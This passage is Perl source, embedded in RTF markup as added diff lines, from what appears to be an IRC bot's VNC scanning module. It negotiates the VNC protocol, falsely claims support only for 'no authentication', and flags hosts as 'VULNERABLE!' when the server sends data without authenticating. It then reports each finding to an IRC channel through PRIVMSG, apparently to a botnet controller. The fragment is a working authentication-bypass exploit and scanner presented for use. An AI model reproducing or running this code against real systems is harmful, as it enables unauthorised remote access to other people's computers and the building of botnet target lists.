+\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\cf2 #\'a0Negotiate\'a0protocol\'a0version. \
+\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\cf4 $sock\cf3 ->\cf4 read\cf3 (\cf4 $proto_ver\cf3 ,\'a0\cf4 12\cf3 ); \
+\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0print\'a0\cf4 $sock\'a0$proto_ver\cf3 ; \
+\'a0 \
+\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\cf2 #\'a0Get\'a0supported\'a0security\'a0types\'a0and\'a0ignore\'a0them. \
+\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\cf4 $sock\cf3 ->\cf4 read\cf3 (\cf4 $sec_types\cf3 ,\'a0\cf4 1\cf3 ); \
+\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\cf4 $sock\cf3 ->\cf4 read\cf3 (\cf4 $ignored\cf3 ,\'a0\cf4 unpack\cf3 (\cf5 'C'\cf3 ,\'a0\cf4 $sec_types\cf3 )); \
+\'a0 \
+\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\cf2 #\'a0Claim\'a0that\'a0we\'a0only\'a0support\'a0no\'a0authentication. \
+\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\cf3 print\'a0\cf4 $sock\'a0\cf5 "\\x01"\cf3 ; \
+\'a0 \
+\'a0 \
+\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\cf2 #\'a0We\'a0should\'a0get\'a0"0000"\'a0back,\'a0indicating\'a0that\'a0they\'a0won't\'a0fall\'a0back\'a0to\'a0no\'a0authentication. \
+\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\cf4 $sock\cf3 ->\cf4 read\cf3 (\cf4 $auth_type\cf3 ,\'a0\cf4 4\cf3 ); \
+\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0if\'a0(\cf4 unpack\cf3 (\cf5 'I'\cf3 ,\'a0\cf4 $auth_type\cf3 ))\'a0\{ \
+\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\cf4 $results\cf3 [\cf4 $hostnum\cf3 ]\'a0.=\'a0\cf5 "Not\'a0vulnerable,\'a0refused\'a0to\'a0support \
+\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0authentication\'a0type.\\n"\cf3 ; \
+\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\cf4 printa\cf3 (\cf5 "*"\cf3 ); \
+\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\cf4 close\cf3 (\cf4 $sock\cf3 ); \
+\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0return; \
+\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\} \
+\'a0 \
+\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\cf2 #\'a0Client\'a0initialize. \
+\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\cf3 print\'a0\cf4 $sock\'a0\cf5 "\\x01"\cf3 ; \
+\'a0 \
+\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\cf2 #\'a0If\'a0the\'a0server\'a0starts\'a0sending\'a0data,\'a0we're\'a0in. \
+\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\cf4 $sock\cf3 ->\cf4 read\cf3 (\cf4 $vnc_data\cf3 ,\'a0\cf4 4\cf3 ); \
+\'a0 \
+\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0if\'a0(\cf4 unpack\cf3 (\cf5 'I'\cf3 ,\'a0\cf4 $vnc_data\cf3 ))\'a0\{ \
+\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\cf4 $results\cf3 [\cf4 $hostnum\cf3 ]\'a0.=\'a0\cf5 "VULNERABLE!\'a0\cf4 $proto_ver\cf5 \\n"\cf3 ; \
+\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\cf4 printa\cf3 (\cf5 "!\'a0\cf4 $host$hostnum\cf5 \'a0VULNERABLE"\cf3 ); \
+\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\}\'a0else\'a0\{ \
+\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\cf4 $results\cf3 [\cf4 $hostnum\cf3 ]\'a0.=\'a0\cf5 "Not\'a0vulnerable,\'a0did\'a0not\'a0send\'a0data.\\n"\cf3 ; \
+\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\cf4 printa\cf3 (\cf5 "*"\cf3 ); \
+\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\} \
+\'a0 \
+\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\cf4 close\cf3 (\cf4 $sock\cf3 ); \
+\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0return; \
+\'a0\'a0\'a0\'a0\} \
+\'a0 \
+\'a0\'a0\'a0\'a0\cf4 sub\'a0printa\'a0\cf3 \{ \
+\'a0\'a0\'a0\'a0print\'a0\'a0\cf5 "PRIVMSG\'a0\cf4 $canale\cf5 \'a0:\'a0"\cf3 .\cf4 $_\cf3 [\cf4 0\cf3 ].\cf5 "\\r\\n"\cf3 ; \
+\'a0}
